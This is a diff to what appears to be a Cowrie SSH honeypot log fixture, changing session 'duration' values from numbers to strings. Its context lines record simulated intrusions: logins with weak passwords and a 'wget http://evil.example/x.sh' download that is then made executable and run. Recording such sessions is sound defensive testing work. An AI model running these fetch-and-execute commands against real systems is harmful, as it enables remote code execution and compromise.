@@ -1,6 +1,6 @@
 {"eventid":"cowrie.session.connect","src_ip":"203.0.113.10","src_port":54321,"dst_ip":"10.0.0.1","dst_port":22,"session":"sess-aaaa-0001","timestamp":"2026-05-17T10:00:00.100Z","message":"New connection"}
 {"eventid":"cowrie.login.failed","username":"admin","password":"admin","session":"sess-aaaa-0001","timestamp":"2026-05-17T10:00:01.500Z","message":"login attempt"}
-{"eventid":"cowrie.session.closed","duration":1.6,"session":"sess-aaaa-0001","timestamp":"2026-05-17T10:00:01.700Z","message":"Connection lost"}
+{"eventid":"cowrie.session.closed","duration":"1.6","session":"sess-aaaa-0001","timestamp":"2026-05-17T10:00:01.700Z","message":"Connection lost"}
 {"eventid":"cowrie.session.connect","src_ip":"198.51.100.42","src_port":48211,"dst_ip":"10.0.0.1","dst_port":22,"session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:00.000Z","message":"New connection"}
 {"eventid":"cowrie.login.success","username":"root","password":"123456","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:01.200Z","message":"login success"}
 {"eventid":"cowrie.command.input","input":"uname -a","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:02.000Z","message":"CMD"}
@@ -8,11 +8,11 @@
 {"eventid":"cowrie.session.file_download","url":"http://evil.example/x.sh","outfile":"var/downloads/x.sh","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:03.500Z","message":"download"}
 {"eventid":"cowrie.command.input","input":"chmod +x /tmp/x.sh","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:04.000Z","message":"CMD"}
 {"eventid":"cowrie.command.input","input":"/tmp/x.sh","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:05.000Z","message":"CMD"}
-{"eventid":"cowrie.session.closed","duration":6.0,"session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:06.000Z","message":"Connection lost"}
+{"eventid":"cowrie.session.closed","duration":"6.0","session":"sess-bbbb-0002","timestamp":"2026-05-17T10:05:06.000Z","message":"Connection lost"}
 {"eventid":"cowrie.session.connect","src_ip":"192.0.2.77","src_port":33010,"dst_ip":"10.0.0.1","dst_port":22,"session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:00.000Z","message":"New connection"}
 {"eventid":"cowrie.login.success","username":"root","password":"123456","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:01.000Z","message":"login success"}
 {"eventid":"cowrie.command.input","input":"uname -a","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:02.000Z","message":"CMD"}
 {"eventid":"cowrie.command.input","input":"wget http://evil.example/x.sh -O /tmp/x.sh","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:03.000Z","message":"CMD"}
 {"eventid":"cowrie.command.input","input":"chmod +x /tmp/x.sh","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:04.000Z","message":"CMD"}
 {"eventid":"cowrie.command.input","input":"/tmp/x.sh","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:05.000Z","message":"CMD"}
-{"eventid":"cowrie.session.closed","duration":6.0,"session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:06.000Z","message":"Connection lost"}
+{"eventid":"cowrie.session.closed","duration":"6.0","session":"sess-cccc-0003","timestamp":"2026-05-17T10:09:06.000Z","message":"Connection lost"}
